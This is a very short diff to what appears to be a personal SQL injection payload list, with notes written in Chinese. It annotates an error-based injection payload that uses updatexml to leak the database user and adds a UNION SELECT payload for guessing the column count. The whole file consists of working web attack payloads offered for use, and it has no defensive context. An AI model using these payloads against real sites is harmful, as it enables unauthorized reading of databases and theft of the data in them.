@@ -1,1 +1,2 @@
-1'--+%0aand+updatexml(1,user(),1)='
+1'--+%0aand+updatexml(1,user(),1)='    报错注入
+1' union select 1,2,3,4,5#    联合注入猜列
